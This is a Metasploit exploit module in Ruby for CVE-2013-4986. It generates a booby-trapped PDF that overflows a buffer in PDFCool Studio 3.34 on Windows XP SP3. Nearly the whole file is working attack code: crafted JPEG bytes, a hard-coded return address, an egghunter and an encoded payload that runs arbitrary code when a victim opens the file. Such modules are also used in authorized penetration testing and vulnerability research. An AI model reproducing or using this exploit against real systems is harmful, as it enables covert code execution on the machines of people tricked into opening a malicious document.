##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::PDF
  include Msf::Exploit::Egghunter

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'PDFCool Studio Buffer Overflow Vulnerability',
      'Description'    => %q{
            PDFCool Studio Suite is prone to a security vulnerability when
            processing PDF files. This vulnerability could be exploited by a remote
            attacker to execute arbitrary code on the target machine by enticing
            users to open a specially crafted PDF file (client-side attack).
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Marcos Accossatto - CORE Exploit Writers Team.', # Vulnerability discovery
          'Muhamad Fadzil Ramli <mind1355 [at] gmail.com> - mind1355.blogspot.com', # metasploit module
        ],
      'References'     =>
        [
          [ 'CVE', '2013-4986' ],
          [ 'CORE', '2013-0828' ],
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread',
        },
      'Payload'        =>
        {
          'Space'       => 2000,
          'EncoderType' => Rex::Encoder::Alpha2::AlphaUpper
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'PDFCool 3.34 / Windows XP SP3 (EN)',
            {
              'Ret' => 0x005EA1EC,
            }
          ]
        ],
      'DisclosureDate' => 'Oct 02 2013',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('FILENAME', [ false, 'The output filename.', 'motiv.pdf'])
      ], self.class)
  end

  def exploit
    file_create(make_pdf)
  end

  def jpeg

        image_data = 
        "\xFF\xD8\xFF\xEE\x00\x0E\x41\x64\x6F\x62\x65\x00\x64\x80\x00\x00\x00\x02" +
        "\xFF\xDB\x00\x84\x00\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x03\x02\x02" +
        "\x02\x03\x04\x03\x03\x03\x03\x04\x05\x04\x04\x04\x04\x04\x05\x05\x05\x05" +
        "\x05\x05\x05\x05\x05\x05\x07\x08\x08\x08\x07\x05\x09\x0A\x0A\x0A\x0A\x09" +
        "\x0C\x0C\x0C\x0C\x0C\x0C\x0C\x0C\x0C\x0C\x0C\x0C\x0C\x0C\x0C\x01\x03\x02" +
        "\x02\x03\x03\x03\x07\x05\x05\x07\x0D\x0A\x09\x0A\x0D\x0F\x0D\x0D\x0D\x0D" +
        "\x0F\x0F\x0C\x0C\x0C\x0C\x0C\x0F\x0F\x0C\x0C\x0C\x0C\x0C\x0C\x0F\x0C\x0E" +
        "\x0E\x0E\x0E\x0E\x0C\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11" +
        "\x11\x11\x11\x11\x11\x11\x11\x11\xFF\xC0\x00\x14\x08\x00\x32\x00\xE6\x04" +
        "\x01\x11\x00\x02\x11\x01\x03\x11\x01\x04\x11\x00\xFF\xC4\x01\xA2\x00\x00" +
        "\x00\x07\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x04\x05\x03" +
        "\x02\x06\x01\x00\x07\x08\x09\x0A\x0B\x01\x54\x02\x02\x03\x01\x01\x01\x01" +
        "\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x03\x04\x05\x06\x07\x08\x09" +
        "\x0A\x0B\x10\x00\x02\x01\x03\x03\x02\x04\x02\x06\x07\x03\x04\x02\x06\x02" +
        "\x73\x01\x02\x03\x11\x04\x00\x05\x21\x12\x31\x41\x51\x06\x13\x61\x22\x71" +
        "\x81\x14\x32\x91\xA1\x07\x15\xB1\x42\x23\xC1\x52\xD1\xE1\x33\x16\x62\xF0" +
        "\x24\x72\x82\xF1\x25\x43\x34\x53\x92\xA2\xB2\x63\x73\xC2\x35\x44\x27\x93" +
        "\xA3\xB3\x36\x17\x54\x64\x74\xC3\xD2\xE2\x08\x26\x83\x09\x0A\x18\x19\x84" +
        "\x94\x45\x46\xA4\xB4\x56\xD3\x55\x28\x1A\xF2\xE3\xF3\xC4\xD4\xE4\xF4\x65" +
        "\x75\x85\x95\xA5\xB5\xC5\xD5\xE5\xF5\x66\x76\x86\x96\xA6\xB6\xC6\xD6\xE6" +
        "\xF6\x37\x47\x57\x67\x77\x87\x97\xA7\xB7\xC7\xD7\xE7\xF7\x38\x48\x58\x68" +
        "\x78\x88\x98\xA8\xB8\xC8\xD8\xE8\xF8\x29\x39\x49\x59\x69\x79\x89\x99\xA9" +
        "\xB9\xC9\xD9\xE9\xF9\x2A\x3A\x4A\x5A\x6A\x7A\x8A\x9A\xAA\xBA\xCA\xDA\xEA" +
        "\xFA\x11\x00\x02\x02\x01\x02\x03\x05\x05\x04\x05\x06\x04\x08\x03\x03\x6D" +
        "\x01\x00\x02\x11\x03\x04\x21\x12\x31\x41\x05\x51\x13\x61\x22\x06\x71\x81" +
        "\x91\x32\xA1\xB1\xF0\x14\xC1\xD1\xE1\x23\x42\x15\x52\x62\x72\xF1\x33\x24" +
        "\x34\x43\x82\x16\x92\x53\x25\xA2\x63\xB2\xC2\x07\x73\xD2\x35\xE2\x44\x83" +
        "\x17\x54\x93\x08\x09\x0A\x18\x19\x26\x36\x45\x1A\x27\x64\x74\x55\x37\xF2" +
        "\xA3\xB3\xC3\x28\x29\xD3\xE3\xF3\x84\x94\xA4\xB4\xC4\xD4\xE4\xF4\x65\x75" +
        "\x85\x95\xA5\xB5\xC5\xD5\xE5\xF5\x46\x56\x66\x76\x86\x96\xA6\xB6\xC6\xD6" +
        "\xE6\xF6\x47\x57\x67\x77\x87\x97\xA7\xB7\xC7\xD7\xE7\xF7\x38\x48\x58\x68" +
        "\x78\x88\x98\xA8\xB8\xC8\xD8\xE8\xF8\x39\x49\x59\x69\x79\x89\x99\xA9\xB9" +
        "\xC9\xD9\xE9\xF9\x2A\x3A\x4A\x5A\x6A\x7A\x8A\x9A\xAA\xBA\xCA\xDA\xEA\xFA" +
        "\xFF\xDA\x00\x0E\x04\x01\x00\x02\x11\x03\x11\x04\x00\x00\x3F\x00\xFB\xF6" +
        "\x48\x50\x49\xE8\x31\x57\xF3\xFF\x00\x91\xFD\x43\xCC\x9A\x6E\x9C\x48\x9E" +
        "\xE1\x54\x8E\xD5\xCC\x9C\x1A\x0C\xB9\x79\x06\x32\xC8\x03\xA9\x84\x27\xF3" +
        "\x03\x43\x06\x9F\x5A\x5F\xBF\x32\x7F\x91\x33\xF7\x31\xF1\xE2\xDD\x0E"

        eggoptions = { :startreg => 'eax', :checksum => true, :eggtag => 'w00t' }
        hunter, egg = generate_egghunter(payload.encoded, nil, eggoptions)

        buf = ''
        buf << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $+10").encode_string # jmp 16 bytes
        buf << "\x90" * 2
        buf << [target.ret].pack('V')
        buf << "\x90" * 8
        buf << hunter
        buf << "\x90" * 32
        buf << egg
        buf << rand_text_alpha_upper(3061 - buf.length)

        image_data << buf

    return image_data
  end

  def nObfu(str)
    return str
  end

  def make_pdf
    # pdf template taken from coolpdf exploit module
    @pdf << header
    add_object(1, nObfu("<</Type/Catalog/Outlines 2 0 R /Pages 3 0 R>>"))
    add_object(2, nObfu("<</Type/Outlines>>"))
    add_object(3, nObfu("<</Type/Pages/Kids[5 0 R]/Count 1/Resources <</ProcSet 4 0 R/XObject <</I0 7 0 R>>>>/MediaBox[0 0 612.0 792.0]>>"))
    add_object(4, nObfu("[/PDF/Text/ImageC]"))
    add_object(5, nObfu("<</Type/Page/Parent 3 0 R/Contents 6 0 R>>"))
    stream_1 = "stream" << eol
    stream_1 << "0.000 0.000 0.000 rg 0.000 0.000 0.000 RG q 265.000 0 0 229.000 41.000 522.000 cm /I0 Do Q" << eol
    stream_1 << "endstream" << eol
    add_object(6, nObfu("<</Length 91>>#{stream_1}"))
    stream = "<<" << eol
    stream << "/Width 230" << eol
    stream << "/BitsPerComponent 8" << eol
    stream << "/Name /X" << eol
    stream << "/Height 50" << eol
    stream << "/Intent /RelativeColorimetric" << eol
    stream << "/Subtype /Image" << eol
    stream << "/Filter /DCTDecode" << eol
    stream << "/Length #{jpeg.length}" << eol
    stream << "/ColorSpace /DeviceCMYK" << eol
    stream << "/Type /XObject" << eol
    stream << ">>"
    stream << "stream" << eol
    stream << jpeg << eol
    stream << "endstream" << eol
    add_object(7, stream)
    finish_pdf
  end

end
